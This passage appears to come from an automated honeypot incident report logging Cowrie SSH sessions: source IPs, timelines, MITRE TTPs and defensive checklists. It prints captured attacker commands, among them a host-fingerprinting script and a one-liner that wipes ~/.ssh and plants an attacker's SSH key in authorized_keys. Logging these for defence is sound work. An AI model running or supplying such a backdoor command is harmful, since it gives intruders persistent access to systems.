| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:35:22` | `cowrie.session.connect` |
| `2026-09-08 03:35:22` | `cowrie.client.version` |
| `2026-09-08 03:35:22` | `cowrie.client.kex` |
| `2026-09-08 03:35:24` | `cowrie.login.success` |
| `2026-09-08 03:35:25` | `cowrie.session.params` |
| `2026-09-08 03:35:25` | `cowrie.command.input` |
| `2026-09-08 03:35:26` | `cowrie.log.closed` |
| `2026-09-08 03:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b374a828f2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:37 |
| **Last Seen** | 2026-09-08 03:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:37:07` | `cowrie.session.connect` |
| `2026-09-08 03:37:07` | `cowrie.client.version` |
| `2026-09-08 03:37:07` | `cowrie.client.kex` |
| `2026-09-08 03:37:09` | `cowrie.login.success` |
| `2026-09-08 03:37:10` | `cowrie.session.params` |
| `2026-09-08 03:37:10` | `cowrie.command.input` |
| `2026-09-08 03:37:11` | `cowrie.log.closed` |
| `2026-09-08 03:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d015cb38183c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:38 |
| **Last Seen** | 2026-09-08 03:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:38:49` | `cowrie.session.connect` |
| `2026-09-08 03:38:49` | `cowrie.client.version` |
| `2026-09-08 03:38:49` | `cowrie.client.kex` |
| `2026-09-08 03:38:51` | `cowrie.login.success` |
| `2026-09-08 03:38:52` | `cowrie.session.params` |
| `2026-09-08 03:38:52` | `cowrie.command.input` |
| `2026-09-08 03:38:53` | `cowrie.log.closed` |
| `2026-09-08 03:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394110d51c29

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:40 |
| **Last Seen** | 2026-09-08 03:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:40:34` | `cowrie.session.connect` |
| `2026-09-08 03:40:34` | `cowrie.client.version` |
| `2026-09-08 03:40:34` | `cowrie.client.kex` |
| `2026-09-08 03:40:36` | `cowrie.login.success` |
| `2026-09-08 03:40:37` | `cowrie.session.params` |
| `2026-09-08 03:40:37` | `cowrie.command.input` |
| `2026-09-08 03:40:38` | `cowrie.log.closed` |
| `2026-09-08 03:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580f9bb1df1c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:42 |
| **Last Seen** | 2026-09-08 03:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:42:21` | `cowrie.session.connect` |
| `2026-09-08 03:42:22` | `cowrie.client.version` |
| `2026-09-08 03:42:22` | `cowrie.client.kex` |
| `2026-09-08 03:42:23` | `cowrie.login.success` |
| `2026-09-08 03:42:24` | `cowrie.session.params` |
| `2026-09-08 03:42:24` | `cowrie.command.input` |
| `2026-09-08 03:42:25` | `cowrie.log.closed` |
| `2026-09-08 03:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8936fc0f7c0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:44 |
| **Last Seen** | 2026-09-08 03:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:44:14` | `cowrie.session.connect` |
| `2026-09-08 03:44:14` | `cowrie.client.version` |
| `2026-09-08 03:44:14` | `cowrie.client.kex` |
| `2026-09-08 03:44:15` | `cowrie.login.success` |
| `2026-09-08 03:44:17` | `cowrie.session.params` |
| `2026-09-08 03:44:17` | `cowrie.command.input` |
| `2026-09-08 03:44:18` | `cowrie.log.closed` |
| `2026-09-08 03:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56fb15c82ae

| Field | Detail |
|---|---|
| **Source IP** | `194.55.94[.]251` |
| **First Seen** | 2026-09-08 03:44 |
| **Last Seen** | 2026-09-08 03:47 |
| **Session Duration** | 159s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:44:35` | `cowrie.session.connect` |
| `2026-09-08 03:44:35` | `cowrie.client.version` |
| `2026-09-08 03:44:36` | `cowrie.client.kex` |
| `2026-09-08 03:44:37` | `cowrie.login.failed` |
| `2026-09-08 03:44:38` | `cowrie.login.success` |
| `2026-09-08 03:44:39` | `cowrie.session.params` |
| `2026-09-08 03:44:39` | `cowrie.command.input` |
| `2026-09-08 03:44:39` | `cowrie.command.failed` |
| `2026-09-08 03:44:39` | `cowrie.log.closed` |
| `2026-09-08 03:44:40` | `cowrie.session.params` |
| `2026-09-08 03:44:40` | `cowrie.command.input` |
| `2026-09-08 03:44:40` | `cowrie.log.closed` |
| `2026-09-08 03:44:41` | `cowrie.session.params` |
| `2026-09-08 03:44:41` | `cowrie.command.input` |
| `2026-09-08 03:44:42` | `cowrie.log.closed` |
| `2026-09-08 03:44:42` | `cowrie.session.params` |
| `2026-09-08 03:44:42` | `cowrie.command.input` |
| `2026-09-08 03:44:43` | `cowrie.log.closed` |
| `2026-09-08 03:44:44` | `cowrie.session.params` |
| `2026-09-08 03:44:44` | `cowrie.command.input` |
| `2026-09-08 03:44:44` | `cowrie.log.closed` |
| `2026-09-08 03:44:45` | `cowrie.session.params` |
| `2026-09-08 03:44:45` | `cowrie.command.input` |
| `2026-09-08 03:44:45` | `cowrie.log.closed` |
| `2026-09-08 03:44:46` | `cowrie.session.params` |
| `2026-09-08 03:44:46` | `cowrie.command.input` |
| `2026-09-08 03:44:46` | `cowrie.log.closed` |
| `2026-09-08 03:44:47` | `cowrie.session.params` |
| `2026-09-08 03:44:47` | `cowrie.command.input` |
| `2026-09-08 03:44:47` | `cowrie.log.closed` |
| `2026-09-08 03:44:48` | `cowrie.session.params` |
| `2026-09-08 03:44:48` | `cowrie.command.input` |
| `2026-09-08 03:44:48` | `cowrie.log.closed` |
| `2026-09-08 03:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.55.94[.]251` to AbuseIPDB if not already reported
- [ ] Block `194.55.94[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b938c850570c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:46 |
| **Last Seen** | 2026-09-08 03:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:46:03` | `cowrie.session.connect` |
| `2026-09-08 03:46:04` | `cowrie.client.version` |
| `2026-09-08 03:46:04` | `cowrie.client.kex` |
| `2026-09-08 03:46:05` | `cowrie.login.success` |
| `2026-09-08 03:46:06` | `cowrie.session.params` |
| `2026-09-08 03:46:06` | `cowrie.command.input` |
| `2026-09-08 03:46:07` | `cowrie.log.closed` |
| `2026-09-08 03:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9561e0b6ec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:47 |
| **Last Seen** | 2026-09-08 03:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:47:52` | `cowrie.session.connect` |
| `2026-09-08 03:47:52` | `cowrie.client.version` |
| `2026-09-08 03:47:52` | `cowrie.client.kex` |
| `2026-09-08 03:47:53` | `cowrie.login.success` |
| `2026-09-08 03:47:55` | `cowrie.session.params` |
| `2026-09-08 03:47:55` | `cowrie.command.input` |
| `2026-09-08 03:47:55` | `cowrie.log.closed` |
| `2026-09-08 03:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d3d30ece614

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:49 |
| **Last Seen** | 2026-09-08 03:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:49:39` | `cowrie.session.connect` |
| `2026-09-08 03:49:40` | `cowrie.client.version` |
| `2026-09-08 03:49:40` | `cowrie.client.kex` |
| `2026-09-08 03:49:41` | `cowrie.login.success` |
| `2026-09-08 03:49:43` | `cowrie.session.params` |
| `2026-09-08 03:49:43` | `cowrie.command.input` |
| `2026-09-08 03:49:43` | `cowrie.log.closed` |
| `2026-09-08 03:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9141b10fad

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-08 03:50 |
| **Last Seen** | 2026-09-08 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:50:41` | `cowrie.session.connect` |
| `2026-09-08 03:50:41` | `cowrie.client.version` |
| `2026-09-08 03:50:41` | `cowrie.client.kex` |
| `2026-09-08 03:50:42` | `cowrie.login.success` |
| `2026-09-08 03:50:42` | `cowrie.direct-tcpip.request` |
| `2026-09-08 03:50:42` | `cowrie.direct-tcpip.data` |
| `2026-09-08 03:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b957932e17b9

| Field | Detail |
|---|---|
| **Source IP** | `31.43.49[.]88` |
| **First Seen** | 2026-09-08 04:01 |
| **Last Seen** | 2026-09-08 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:01:03` | `cowrie.session.connect` |
| `2026-09-08 04:01:04` | `cowrie.login.success` |
| `2026-09-08 04:01:04` | `cowrie.session.params` |
| `2026-09-08 04:01:05` | `cowrie.command.input` |
| `2026-09-08 04:01:05` | `cowrie.command.failed` |
| `2026-09-08 04:01:05` | `cowrie.log.closed` |
| `2026-09-08 04:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.43.49[.]88` to AbuseIPDB if not already reported
- [ ] Block `31.43.49[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d6ab05baf9

| Field | Detail |
|---|---|
| **Source IP** | `8.217.211[.]182` |
| **First Seen** | 2026-09-08 04:10 |
| **Last Seen** | 2026-09-08 04:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:10:43` | `cowrie.session.connect` |
| `2026-09-08 04:10:43` | `cowrie.client.version` |
| `2026-09-08 04:10:43` | `cowrie.client.kex` |
| `2026-09-08 04:10:44` | `cowrie.login.success` |
| `2026-09-08 04:10:45` | `cowrie.session.params` |
| `2026-09-08 04:10:45` | `cowrie.command.input` |
| `2026-09-08 04:10:45` | `cowrie.command.failed` |
| `2026-09-08 04:10:46` | `cowrie.log.closed` |
| `2026-09-08 04:10:47` | `cowrie.session.params` |
| `2026-09-08 04:10:47` | `cowrie.command.input` |
| `2026-09-08 04:10:47` | `cowrie.session.file_download` |
| `2026-09-08 04:10:47` | `cowrie.log.closed` |
| `2026-09-08 04:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.211[.]182` to AbuseIPDB if not already reported
- [ ] Block `8.217.211[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b78fb7a3fea

| Field | Detail |
|---|---|
| **Source IP** | `8.217.211[.]182` |
| **First Seen** | 2026-09-08 04:10 |
| **Last Seen** | 2026-09-08 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:10:47` | `cowrie.session.connect` |
| `2026-09-08 04:10:47` | `cowrie.client.version` |
| `2026-09-08 04:10:47` | `cowrie.client.kex` |
| `2026-09-08 04:10:48` | `cowrie.login.success` |
| `2026-09-08 04:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.211[.]182` to AbuseIPDB if not already reported
- [ ] Block `8.217.211[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94a7222ff1e1

| Field | Detail |
|---|---|
| **Source IP** | `8.217.211[.]182` |
| **First Seen** | 2026-09-08 04:10 |
| **Last Seen** | 2026-09-08 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:10:49` | `cowrie.session.connect` |
| `2026-09-08 04:10:49` | `cowrie.client.version` |
| `2026-09-08 04:10:49` | `cowrie.client.kex` |
| `2026-09-08 04:10:50` | `cowrie.login.success` |
| `2026-09-08 04:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.211[.]182` to AbuseIPDB if not already reported
- [ ] Block `8.217.211[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8915395f2c82

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-09-08 04:11 |
| **Last Seen** | 2026-09-08 04:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:11:01` | `cowrie.session.connect` |
| `2026-09-08 04:11:01` | `cowrie.client.version` |
| `2026-09-08 04:11:01` | `cowrie.client.kex` |
| `2026-09-08 04:11:02` | `cowrie.login.success` |
| `2026-09-08 04:11:03` | `cowrie.session.params` |
| `2026-09-08 04:11:03` | `cowrie.command.input` |
| `2026-09-08 04:11:03` | `cowrie.command.failed` |
| `2026-09-08 04:11:04` | `cowrie.log.closed` |
| `2026-09-08 04:11:05` | `cowrie.session.params` |
| `2026-09-08 04:11:05` | `cowrie.command.input` |
| `2026-09-08 04:11:05` | `cowrie.session.file_download` |
| `2026-09-08 04:11:05` | `cowrie.log.closed` |
| `2026-09-08 04:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2119cbf7f2ff

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-09-08 04:11 |
| **Last Seen** | 2026-09-08 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:11:05` | `cowrie.session.connect` |
| `2026-09-08 04:11:05` | `cowrie.client.version` |
| `2026-09-08 04:11:05` | `cowrie.client.kex` |
| `2026-09-08 04:11:06` | `cowrie.login.success` |
| `2026-09-08 04:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1beb293617d6

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-09-08 04:11 |
| **Last Seen** | 2026-09-08 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:11:07` | `cowrie.session.connect` |
| `2026-09-08 04:11:07` | `cowrie.client.version` |
| `2026-09-08 04:11:07` | `cowrie.client.kex` |
| `2026-09-08 04:11:08` | `cowrie.login.success` |
| `2026-09-08 04:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f37b52e7478

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]205` |
| **First Seen** | 2026-09-08 04:11 |
| **Last Seen** | 2026-09-08 04:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
